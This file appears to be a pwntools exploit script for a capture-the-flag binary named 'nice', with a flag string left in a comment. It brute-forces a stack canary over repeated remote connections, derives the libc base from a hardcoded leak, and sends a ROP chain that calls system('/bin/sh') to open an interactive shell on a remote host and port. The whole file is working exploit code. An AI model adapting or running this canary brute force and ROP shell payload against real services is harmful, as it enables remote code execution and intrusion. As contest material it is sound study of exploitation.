#!/usr/bin/python

from pwn import *

PATH = './nice'

GDBSCRIPT = '''

'''

HOST = '172.17.0.2'
PORT = 4444

HOST = '103.41.207.206'
PORT = 8296

def find_canary():
    canary = b'\0'
    while len(canary) < 8:
        for i in range(256):
            print(len(canary), i)
            r = remote(HOST, PORT)
            r.send(b'A' * 0x38 + canary + bytes([i]))
            try:
                r.recvline(0)
            except:
                canary += bytes([i])
                print(canary)
                break
            r.close()
    return canary
    

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('/home/abdullahnz/debug/ubuntu-20.04/libc64/libc.so.6', 0)

    '''
    0x7ffdb396fc90:	0x00007ffdb396fd90	0x81628625b037c000
    0x7ffdb396fca0:	0x0000000000000000	0x00007f8f9357c0b3
    '''
    canary = p64(0xc54d966138e6ad00)
    libc_leak = b'\x2b\xf0\xca\x2e\xdc\x7f\x00\x00'
    libc.address = u64(libc_leak) - 0x2702b

    # hacktoday{omg_u_can_exploit_me}

    print(hex(libc.address))

    pop_rdi_ret = libc.address + 0x0000000000026b72 # pop rdi ; ret
    str_bin_sh  = libc.search(b'/bin/sh').__next__()

    payload = b'A' * 0x38 + canary + canary + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(pop_rdi_ret + 1) + p64(libc.sym['system'])
    
    r = remote(HOST, PORT)
    r.send(payload)
    r.interactive()
    
